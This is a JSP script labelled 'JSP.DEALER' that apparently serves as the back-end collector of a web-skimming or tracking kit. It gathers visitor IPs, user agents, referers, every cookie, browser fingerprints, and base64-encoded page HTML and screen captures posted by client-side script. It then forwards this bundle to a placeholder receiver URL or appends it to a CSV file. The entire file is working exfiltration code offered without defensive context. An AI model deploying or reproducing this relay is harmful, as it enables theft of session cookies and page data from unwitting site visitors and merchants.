<%@ page import="java.io.*, java.net.*, java.util.*, org.json.JSONObject" %>

<%     
    String DEALER_NAME = "JSP.DEALER"; //LOVEISINTHE.NET
    String MODE = "SENDER"; //SAVER or SENDER
    String PATH_WRITER = "/tmp/out.csv";     
    String URI_REZ = "RECIVER_URI";
    
    String IP = request.getRemoteAddr();
    String userAgent = request.getHeader("User-Agent");

    String UA = userAgent.replace("\"", "");
    
    String fpUser = request.getParameter("u") != null ? request.getParameter("u") : "";
    String fpBrowser = request.getParameter("b") != null ? request.getParameter("b") : "";
    String fpRequest = request.getParameter("r") != null ? request.getParameter("r") : "";
    String jsData = request.getParameter("data") != null ? request.getParameter("data") : "";
    String encodedPage = request.getParameter("code") != null ? request.getParameter("code") : "";
    String encodedScr = request.getParameter("s") != null ? request.getParameter("s") : "";
    long TS = System.currentTimeMillis() / 1000L;
    
    String referer = request.getHeader("Referer") != null ? request.getHeader("Referer") : "No referer";
    String origin = request.getHeader("Origin") != null ? request.getHeader("Origin") : "No origin";
    
    Cookie[] cookiesArray = request.getCookies();
    Map<String, String> cookies = new HashMap<>();
    if (cookiesArray != null) {
        for (Cookie cookie : cookiesArray) {
            cookies.put(cookie.getName(), cookie.getValue());
        }
    }
    
    JSONObject requestData = new JSONObject();
    requestData.put("headers", request.getHeaderNames());
    requestData.put("dealer_uri", origin);
    requestData.put("merca_uri", referer);
    requestData.put("cookies", cookies);
    requestData.put("requestURL", request.getRequestURI());
    requestData.put("method", request.getMethod());

    String encodedReq = Base64.getEncoder().encodeToString(requestData.toString().getBytes());
    
    Map<String, String> data = new HashMap<>();
    data.put("DEALER_NAME", DEALER_NAME);
    data.put("IP", IP);
    data.put("UA", URLEncoder.encode(UA, "UTF-8"));
    data.put("FP_USER", fpUser);
    data.put("FP_BROWSER", fpBrowser);
    data.put("FP_REQUEST", fpRequest);
    data.put("HTML_ENCODED", encodedPage);
    data.put("SCREEN_ENCODED", encodedScr);
    data.put("JS_DATA", jsData);
    data.put("encoded_req", encodedReq);

    if (MODE.equals("SENDER")) {        
        try {
            URL url = new URL(URI_REZ);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            conn.setDoOutput(true);

            StringBuilder postData = new StringBuilder();
            for (Map.Entry<String, String> entry : data.entrySet()) {
                if (postData.length() != 0) postData.append('&');
                postData.append(URLEncoder.encode(entry.getKey(), "UTF-8"));
                postData.append('=');
                postData.append(URLEncoder.encode(String.valueOf(entry.getValue()), "UTF-8"));
            }

            byte[] postDataBytes = postData.toString().getBytes("UTF-8");
            try (OutputStream os = conn.getOutputStream()) {
                os.write(postDataBytes, 0, postDataBytes.length);
            }

            InputStream responseStream = conn.getInputStream();
            BufferedReader reader = new BufferedReader(new InputStreamReader(responseStream));
            String line;
            StringBuilder response = new StringBuilder();
            while ((line = reader.readLine()) != null) {
                response.append(line);
            }

            responseStream.close();
            out.print(response.toString());

        } catch (Exception e) {
            e.printStackTrace();
        }

    } else {        
        try (FileWriter writer = new FileWriter(PATH_WRITER, true)) {
            writer.append(String.join(",", data.values()));
            writer.append("\n");
            writer.flush();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

%>
